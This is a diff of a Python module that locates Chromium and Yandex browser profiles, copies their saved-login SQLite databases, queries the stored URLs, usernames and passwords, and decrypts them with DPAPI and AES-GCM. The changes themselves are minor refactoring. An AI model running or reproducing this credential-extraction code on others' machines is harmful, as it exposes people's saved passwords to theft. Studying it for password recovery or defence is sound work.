@@ -3,7 +3,7 @@ import json
 import os
 import shutil
 import sqlite3
-import uuid
+from tempfile import NamedTemporaryFile
 
 import win32crypt
 from Crypto.Cipher import AES
@@ -42,10 +42,7 @@ class ChromiumBased:
                 pass
 
         for profile in profiles:
-            try:
-                files = os.listdir(os.path.join(self.user_data_path, profile))
-            except:
-                continue
+            files = os.listdir(os.path.join(self.user_data_path, profile))
             for db in files:
                 if db.lower() in ("login data", "ya passman data"):
                     databases.add(os.path.join(self.user_data_path, profile, db))
@@ -56,21 +53,21 @@ class ChromiumBased:
         credentials = []
 
         for db in self.database_paths:
-            temp_db = str(uuid.uuid4())
-            shutil.copyfile(db, temp_db)
+            temp_db = NamedTemporaryFile(delete=False)
+            shutil.copyfile(db, temp_db.name)
 
             try:
-                conn = sqlite3.connect(temp_db)
+                conn = sqlite3.connect(temp_db.name)
                 curs = conn.cursor()
                 db_query = "SELECT origin_url, username_value, password_value FROM logins"
                 curs.execute(db_query)
                 logins_data = curs.fetchall()
-            except sqlite3.DatabaseError as err:
-                print(indent_text("Error with {}: {}".format(db, err)))
+            except sqlite3.DatabaseError as e:
+                print(indent_text("Error with {}: {}".format(db, e)))
                 continue
             finally:
                 conn.close()
-                os.remove(temp_db)
+                del temp_db
 
             if not logins_data:
                 continue
@@ -104,8 +101,8 @@ class ChromiumBased:
     def _decrypt_password(self, encrypted_password, key):
         DPAPI_version_prefix = "v10"
 
-        nonce_length = 12; # 96 / 8
-        auth_tag_length = 16; # 128 / 8
+        nonce_length = 12 # 96 / 8
+        auth_tag_length = 16 # 128 / 8
 
         if not self.is_yandex:
             encrypted_password = encrypted_password[len(DPAPI_version_prefix):]
